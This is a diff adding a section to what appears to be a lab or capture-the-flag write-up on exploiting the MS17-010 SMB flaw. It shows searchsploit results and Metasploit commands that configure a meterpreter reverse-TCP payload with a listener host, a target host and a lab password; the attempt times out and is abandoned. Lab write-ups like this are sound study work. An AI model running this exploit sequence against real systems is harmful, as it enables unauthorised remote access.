@@ -282,7 +282,70 @@ Are those base64-encoded credentials?
 
 ## Exploiting SMB MS17-010
 
+    $ searchsploit MS17-010                
+    ---------------------------------------------- ---------------------------------
+     Exploit Title                                |  Path
+    ---------------------------------------------- ---------------------------------
+    Microsoft Windows - 'EternalRomance'/'Eternal | windows/remote/43970.rb
+    Microsoft Windows - SMB Remote Code Execution | windows/dos/41891.rb
+    Microsoft Windows 7/2008 R2 - 'EternalBlue' S | windows/remote/42031.py
+    Microsoft Windows 7/8.1/2008 R2/2012 R2/2016  | windows/remote/42315.py
+    Microsoft Windows 8/8.1/2012 R2 (x64) - 'Eter | windows_x86-64/remote/42030.py
+    Microsoft Windows Server 2008 R2 (x64) - 'Srv | windows_x86-64/remote/41987.py
+    ---------------------------------------------- ---------------------------------
+    Shellcodes: No Results
+    Papers: No Results
 
+Mirroring:
+
+    $ searchsploit -m windows/remote/43970.rb
+      Exploit: Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution (Metasploit) (MS17-010)
+          URL: https://www.exploit-db.com/exploits/43970
+         Path: /usr/share/exploitdb/exploits/windows/remote/43970.rb
+    File Type: Ruby script, ASCII text
+    
+    Copied to: /home/nina/43970.rb
+
+Firing up Metasploit:
+
+    msf6 > search MS17-010
+    
+    Matching Modules
+    ================
+    
+       #  Name                                      Disclosure Date  Rank     Check  Description
+       -  ----                                      ---------------  ----     -----  -----------
+       0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+       1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+       2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+       3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
+       4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+    
+Trying 1:
+
+    msf6 > use 1
+    [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+    msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST 10.9.1.53
+    LHOST => 10.9.1.53
+    msf6 exploit(windows/smb/ms17_010_psexec) > set LPORT 8888
+    LPORT => 8888
+    msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.201.108
+    RHOSTS => 10.10.201.108
+    msf6 exploit(windows/smb/ms17_010_psexec) > set SMBPass !P@$$W0rD!123
+    SMBPass => !P@$$W0rD!123
+    msf6 exploit(windows/smb/ms17_010_psexec) > set SMBUser Bob
+    SMBUser => Bob
+    msf6 exploit(windows/smb/ms17_010_psexec) > run
+
+Results:
+
+    [*] Started reverse TCP handler on 10.9.1.53:8888 
+    [*] 10.10.201.108:445 - Authenticating to 10.10.201.108 as user 'Bob'...
+    [-] 10.10.201.108:445 - Rex::ConnectionTimeout: The connection with (10.10.201.108:445) timed out.
+    [*] Exploit completed, but no session was created.
+
+Also tried other username (Bill), other shares, and the `auxilliary/admin/smb/ms17_010_command`. All timed out.
+Researched possible causes, but kinda gave up on it. Too much of a rabbit hole. Will try another route.
 
 ## Exploiting HTTP on port 49663
 
